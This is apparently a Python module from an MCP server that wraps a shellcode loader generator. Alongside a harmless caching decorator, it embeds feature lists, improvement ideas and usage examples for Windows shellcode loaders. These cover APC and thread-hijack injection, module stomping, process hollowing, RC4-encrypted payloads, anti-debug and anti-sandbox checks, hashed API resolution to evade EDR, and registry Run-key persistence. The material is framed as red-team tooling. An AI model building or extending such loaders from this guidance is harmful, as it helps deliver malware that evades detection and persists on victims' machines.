"""
资源增强模块：为 MCP 资源函数提供缓存和动态内容生成。
"""
import functools
import time
from typing import Any, Callable, Dict, List, Optional
from dataclasses import asdict

from config import LoaderConfig, get_global_config, set_global_config
from load_method_registry import registry


def cached_resource(maxsize: int = 128, ttl: Optional[int] = None):
    """
    缓存装饰器，用于 MCP 资源函数。
    
    参数:
        maxsize: LRU 缓存的最大条目数。
        ttl: 缓存条目的生存时间（秒），None 表示永不过期。
    """
    def decorator(func: Callable) -> Callable:
        cache = functools.lru_cache(maxsize=maxsize)(func)
        last_updated = {}

        @functools.wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            # 生成缓存键
            key = (args, tuple(sorted(kwargs.items())))
            now = time.time()
            if ttl is not None:
                if key in last_updated and now - last_updated[key] > ttl:
                    # 缓存过期，清除并重新计算
                    cache.cache_clear()
                    last_updated.clear()
                last_updated[key] = now
            return cache(*args, **kwargs)
        return wrapper
    return decorator


class DynamicResourceGenerator:
    """动态资源生成器，提供实时统计和配置信息。"""
    
    @staticmethod
    def get_registry_stats() -> Dict[str, Any]:
        """获取加载方式注册表的统计信息。"""
        methods = registry.list_all()
        return {
            "total_registered": len(methods),
            "methods": list(methods.keys()),
            "descriptions": methods,
        }
    
    @staticmethod
    def get_config_preview(config: Optional[LoaderConfig] = None) -> Dict[str, Any]:
        """获取配置预览。"""
        if config is None:
            config = get_global_config()
        if config is None:
            # 返回默认配置预览
            config = LoaderConfig()
        return asdict(config)
    
    @staticmethod
    def get_system_stats() -> Dict[str, Any]:
        """获取系统统计信息（模拟）。"""
        import platform
        import os
        return {
            "platform": platform.system(),
            "platform_version": platform.version(),
            "python_version": platform.python_version(),
            "current_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "process_id": os.getpid(),
        }
    
    @staticmethod
    def generate_full_features() -> str:
        """生成增强版完整功能说明，包含动态统计。"""
        stats = DynamicResourceGenerator.get_registry_stats()
        config_preview = DynamicResourceGenerator.get_config_preview()
        system_stats = DynamicResourceGenerator.get_system_stats()
        
        base = """
全功能Shellcode加载器特性：
1. 多加载方式（{total}种已注册）：
   - 动态加载（Dynamic Load）：直接内存分配执行
   - 纤程加载（Fiber Load）：通过纤程切换执行
   - APC注入（APC-Inject Load）：队列APC对象执行
   - 线程劫持（Thread Hiijack）：修改现有线程上下文
   - 模块踩踏（Module Stomp）：利用合法DLL的.text节区
   - SEH异常执行：在异常处理中触发Shellcode
   - 系统调用执行（Syscall Load）：通过ntdll系统调用

2. 自动加密：
   - RC4算法加密Shellcode
   - 128位随机密钥（时间种子）
   - 相同Shellcode生成不同加载器（MD5唯一）

3. 反检测技术：
   - 反调试：IsDebuggerPresent、调试寄存器、时间戳检测
   - 反沙箱：进程数、启动时间、内存大小、CPU核心数、虚拟机文件检测
   - 动态函数解析：哈希方式获取API地址（无明文特征）

4. 辅助功能：
   - 自启动：修改HKCU注册表启动项
   - 多架构支持：x86/x64分别适配
   - 调试日志：可选输出加载过程信息

【动态统计】
- 已注册加载方式数量：{total}
- 当前默认架构：{arch}
- 默认加载方式：{load_method}
- 系统平台：{platform}
- 生成时间：{current_time}
"""
        return base.format(
            total=stats["total_registered"],
            arch=config_preview.get("arch", "x64"),
            load_method=config_preview.get("load_method", "Dynamic Load"),
            platform=system_stats["platform"],
            current_time=system_stats["current_time"],
        )
    
    @staticmethod
    def generate_code_structure() -> str:
        """生成增强版代码结构说明，包含扩展点统计。"""
        stats = DynamicResourceGenerator.get_registry_stats()
        base = """
现有代码核心模块及扩展点分析：
1. 加载器核心（各ExecuteLoader实现）：
   - Module Stomp：通过LoadDllFile加载固定牺牲DLL，覆盖.text节执行。
     可扩展点：牺牲DLL路径随机化、.text节特征擦除、多节区选择。
   - SEH Except Load：通过访问冲突异常执行，内存分配逻辑简单。
     可扩展点：异常链嵌套（多层SEH）、内存页隐藏（NtProtectVirtualMemory）。
   - Syscall Load：依赖ntdll导出函数，未使用直接系统调用。
     可扩展点：硬编码syscall号（绕过GetProcAddress）、调用栈伪装。
   - 进程空洞注入：固定创建notepad.exe，未清理PEB信息。
     可扩展点：动态选择系统进程（如svchost.exe）、PEB模块列表隐藏。

2. 反检测模块（当前仅隐含基础逻辑）：
   - 现有实现：无显式反调试/反沙箱代码（需结合参数启用）。
     可扩展点：添加调试端口检测（NtQueryInformationProcess）、CPU指令延迟检测（反沙箱）、注册表项检查（VMware/VirtualBox）。

3. 加密模块（当前仅RC4）：
   - 现有实现：固定算法，密钥需手动传入。
     可扩展点：支持AES-256-GCM、密钥动态生成（基于主板UUID）、分段加密（避免一次性解密暴露）。

4. 内存操作：
   - 现有实现：VirtualAlloc直接分配RWX权限，无内存擦除。
     可扩展点：分阶段权限修改（先RW再RX）、Shellcode执行后内存清零、利用未公开API（如NtAllocateVirtualMemoryEx）。

【扩展能力统计】
- 已注册加载方式：{total} 种
- 支持动态注册新加载方式：是
- 支持架构过滤：是（通过装饰器标记）
- 模板引擎：Jinja2（支持自定义模板）
"""
        return base.format(total=stats["total_registered"])
    
    @staticmethod
    def generate_usage_examples() -> str:
        """生成增强版使用示例，包含动态配置预览。"""
        config_preview = DynamicResourceGenerator.get_config_preview()
        base = """
典型使用示例（按场景分类）：

一、基础功能验证（新手入门）
------------------------------------------------
1. 最小化配置（默认参数快速测试）：
   generate_full_loader(
       shellcode_path=".\\test.bin"  # 仅指定Shellcode路径，其余默认
   )
   # 效果：x64架构、Dynamic Load方式、无加密/反检测、不启用调试

2. 调试模式验证（排查加载问题）：
   generate_full_loader(
       shellcode_path=".\\payload.bin",
       enable_debug=True,  # 输出详细日志（文件操作/内存分配过程）
       arch="x86",
       load_method="Fiber Load"
   )
   # 验证：运行时打印"[*] 纤程加载方式执行Shellcode"等调试信息


二、加密与安全增强（对抗静态分析）
------------------------------------------------
3. RC4加密保护（带密钥管理）：
   generate_full_loader(
       shellcode_path=".\\encrypted.bin",
       encrypt_shellcode=True,
       encryption_key="S3cr3tK3y!2024",  # 自定义16-32位密钥
       use_dynamic_resolve=True  # 动态解析CryptoAPI函数避免IAT特征
   )
   # 注意：加密后的Shellcode需用同密钥生成（可配合外部加密工具）

4. 硬件绑定密钥（防止未授权使用）：
   generate_full_loader(
       shellcode_path=".\\hw_locked.bin",
       encrypt_shellcode=True,
       encryption_key="hw_based",  # 特殊值：基于主板UUID生成密钥
       anti_sandbox=True  # 防止在虚拟机中提取密钥
   )


三、高级注入技术（对抗EDR监控）
------------------------------------------------
5. 模块踩踏增强（自定义牺牲DLL）：
   generate_full_loader(
       shellcode_path=".\\stomp.bin",
       load_method="Module Stomp",
       sacrificial_dll="C:\\Windows\\System32\\bcrypt.dll",  # 替换默认combase.dll
       anti_debug=True,  # 检测调试器时终止
       arch="x64"
   )
   # 优势：利用系统签名DLL内存空间执行，隐蔽性更高

6. 线程劫持注入（目标进程定制）：
   generate_full_loader(
       shellcode_path=".\\hijack.bin",
       load_method="Thread Hiijack-Inject Load",
       use_dynamic_resolve=True,  # 避免直接导入OpenThread等敏感函数
       enable_debug=True
   )
   # 说明：默认劫持notepad.exe线程，可在源码中修改目标进程名

7. 早期APC注入（绕过进程初始化监控）：
   generate_full_loader(
       shellcode_path=".\\early_apc.bin",
       load_method="Early Brid APC-Inject Load",
       arch="x86",
       anti_sandbox=True  # 跳过沙箱环境的早期注入
   )


四、反检测与持久化（红队实战）
------------------------------------------------
8. 全量反检测套餐（反调试+反沙箱+动态解析）：
   generate_full_loader(
       shellcode_path=".\\redteam.bin",
       anti_debug=True,  # 4种调试器检测（含时间戳/调试寄存器）
       anti_sandbox=True,  # 进程数/内存/虚拟机文件检测
       use_dynamic_resolve=True,  # 哈希解析API避免静态特征
       load_method="Syscall Load"  # 直接系统调用执行，绕过API钩子
   )

9. 持久化配置（自启动+加密保护）：
   generate_full_loader(
       shellcode_path=".\\persist.bin",
       auto_start=True,  # 写入HKCU\\Run注册表
       encrypt_shellcode=True,
       encryption_key="Persist!Key",
       load_method="Dynamic Load plus"  # 增强版动态加载（含内存擦除）
   )


五、特殊场景适配
------------------------------------------------
10. 32位系统兼容（旧环境适配）：
    generate_full_loader(
        shellcode_path=".\\x86_payload.bin",
        arch="x86",
        load_method="TLS CallBack Load",  # 利用TLS回调执行，32位专属
        sacrificial_dll="C:\\Windows\\SysWOW64\\kernel.appcore.dll"  # 32位DLL
    )

11. 进程空洞注入（无文件落地）：
    generate_full_loader(
        shellcode_path=".\\hollow.bin",
        use_process_hollowing=True,  # 启用进程空洞模式
        anti_debug=True,
        enable_debug=True  # 输出目标进程PID和注入状态
    )


【当前默认配置预览】
- 架构：{arch}
- 默认加载方式：{load_method}
- 牺牲DLL路径：{sacrificial_dll}
- 加密开关：{encrypt_shellcode}
- 反调试：{anti_debug}
- 反沙箱：{anti_sandbox}
- 自启动：{auto_start}
"""
        return base.format(
            arch=config_preview.get("arch", "x64"),
            load_method=config_preview.get("load_method", "Dynamic Load"),
            sacrificial_dll=config_preview.get("sacrificial_dll", "C:\\Windows\\System32\\combase.dll"),
            encrypt_shellcode=config_preview.get("encrypt_shellcode", False),
            anti_debug=config_preview.get("anti_debug", False),
            anti_sandbox=config_preview.get("anti_sandbox", False),
            auto_start=config_preview.get("auto_start", False),
        )


# 全局动态资源生成器实例
dynamic_generator = DynamicResourceGenerator()